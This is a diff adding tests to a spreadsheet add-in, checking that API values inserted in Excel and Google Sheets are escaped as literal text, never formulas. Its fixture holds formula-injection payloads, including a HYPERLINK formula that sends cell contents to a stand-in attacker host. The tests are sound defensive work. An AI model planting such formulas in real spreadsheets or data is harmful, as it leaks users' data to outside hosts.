@@ -106,3 +106,29 @@ test('Apps Script: the challenge is the S256 of the verifier, custom functions n
     gs.PropertiesService.getScriptProperties().setProperty('CAIRN_API_URL', 'http://cairn.test/cairn/api');
     assert.throws(() => gs.authorizationUrl(), /not set up/);
 });
+
+// Values written into cells (not formulas) must never become formulas: a value from the data such as
+// =HYPERLINK("https://evil.test/?"&A1) or =IMPORTXML(...) would otherwise run in the person's workbook.
+const INJECTED = [['name', 'note'], ['=HYPERLINK("https://evil.test/?"&A1,"x")', '+1+cmd'], ['@SUM(A1)', '-2+3'], ['ok', 42]];
+
+test('Excel: values inserted from the task pane are literal text, never formulas', () => {
+    const { ctx } = loadExcel(dist);
+    const out = ctx.CairnAddin.literalCells(INJECTED);
+    assert.deepEqual(JSON.parse(JSON.stringify(out)), [['name', 'note'], ["'=HYPERLINK(\"https://evil.test/?\"&A1,\"x\")", "'+1+cmd"],
+                                                       ["'@SUM(A1)", "'-2+3"], ['ok', 42]]);
+    const taskpane = readFileSync(join(dist, 'excel', 'taskpane.js'), 'utf8');
+    assert.match(taskpane, /CairnAddin\.literalCells\(/);
+    assert.doesNotMatch(taskpane, /charAt\(0\) === '='/);       // no guessing a formula from the data
+});
+
+test('Apps Script: metric values inserted at the selection are literal text, never formulas', () => {
+    const { gs, user, cells } = loadSheets(dist, { api: 'https://cairn.test/cairn/api', scriptId: 'S'.repeat(30) });
+    user.setProperty('cairn.tokens', JSON.stringify({ access_token: 'cat_x', refresh_token: 'car_x', expires_at: Date.now() + 3600e3 }));
+    gs.UrlFetchApp = { fetch: () => ({ getResponseCode: () => 200, getContentText: () => JSON.stringify({ values: INJECTED }) }) };
+    gs.insertMetricValues('revenue', '', '');
+    const written = cells.values[0].v;
+    assert.equal(written[1][0], "'=HYPERLINK(\"https://evil.test/?\"&A1,\"x\")");
+    assert.equal(written[1][1], "'+1+cmd");
+    assert.equal(written[2][0], "'@SUM(A1)");
+    assert.equal(written[3][1], 42);
+});
